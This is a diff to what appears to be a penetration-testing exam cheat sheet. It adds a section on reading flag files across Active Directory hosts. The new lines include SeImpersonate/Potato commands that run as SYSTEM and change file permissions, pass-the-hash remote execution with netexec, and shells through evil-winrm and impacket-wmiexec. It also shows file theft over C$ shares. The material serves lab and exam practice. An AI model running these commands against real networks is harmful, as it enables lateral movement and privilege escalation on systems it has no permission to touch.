@@ -3752,6 +3752,24 @@ Get-ChildItem C:\Users\ -Recurse -Include *.txt -EA SilentlyContinue | Select-St
 where /r C:\ proof.txt                                          # locate proof.txt
 type C:\Users\Administrator\Desktop\proof.txt                   # common spot
 findstr /s /i &quot;OS{ flag&quot; C:\Users\*.txt 2&gt;nul                   # find by content</code></pre>
+<h2 id="v8--active-directory-domain-hosts-reading-flags-remotely">🏰 Active Directory — domain hosts &amp; reading flags remotely<a class="anchor" href="#v8--active-directory-domain-hosts-reading-flags-remotely">#</a></h2>
+<blockquote>In an AD set **every host has its own <code>local.txt</code> + <code>proof.txt</code>** — grab them on the entry box, each pivot host, AND the DC. Three AD-specific gotchas:</blockquote>
+<pre><code># ⚠️ 1) the admin profile on a DC is usually RENAMED (not &quot;Administrator&quot;):
+dir C:\Users                                            # look for Administrator.&lt;DOMAIN&gt;, e.g. Administrator.DC01
+type C:\Users\Administrator.DC01\Desktop\proof.txt      # use the REAL name you see
+where /r C:\ proof.txt                                  # ...or just hunt it (then: type &lt;full path&gt;)
+
+# ⚠️ 2) &quot;Access is denied&quot; even though you&#x27;re privileged? read it AS SYSTEM (SeImpersonate/Potato):
+#    have SYSTEM copy the flag somewhere you can read, and grant yourself access:
+.\ps.exe -c &quot;cmd /c type C:\Users\Administrator.DC01\Desktop\proof.txt &gt; C:\Users\&lt;you&gt;\Desktop\o.txt &amp; icacls C:\Users\&lt;you&gt;\Desktop\o.txt /grant &lt;you&gt;:F&quot;
+type C:\Users\&lt;you&gt;\Desktop\o.txt                       # (full detail: [POTATO-GOTCHAS])
+
+# ⚠️ 3) read a flag on ANOTHER domain host WITHOUT a full shell (you have admin creds/hash there):
+nxc smb &lt;host&gt; -u &lt;u&gt; -p &lt;p&gt; -x &quot;type C:\Users\Administrator\Desktop\proof.txt&quot;     # run a cmd remotely
+nxc smb &lt;host&gt; -u &lt;u&gt; -H &lt;ntlm&gt; -x &quot;type C:\Users\*\Desktop\*.txt&quot;                  # Pass-the-Hash variant
+evil-winrm -i &lt;host&gt; -u &lt;u&gt; -p &lt;p&gt;                       # ...or get a shell, then type it
+impacket-wmiexec &lt;domain&gt;/&lt;u&gt;:&lt;p&gt;@&lt;host&gt; &quot;type C:\Users\Administrator\Desktop\proof.txt&quot;
+smbclient //&lt;host&gt;/C$ -U &#x27;&lt;u&gt;%&lt;p&gt;&#x27; -c &#x27;get Users\Administrator\Desktop\proof.txt&#x27;   # pull it via the C$ share</code></pre>
 <h2 id="v8--linux-on-a-target-shell">🐧 Linux (on a target shell)<a class="anchor" href="#v8--linux-on-a-target-shell">#</a></h2>
 <pre><code>id                                                             # who am I?
 ls -la /root/ /home/*/ 2&gt;/dev/null                             # the two usual spots
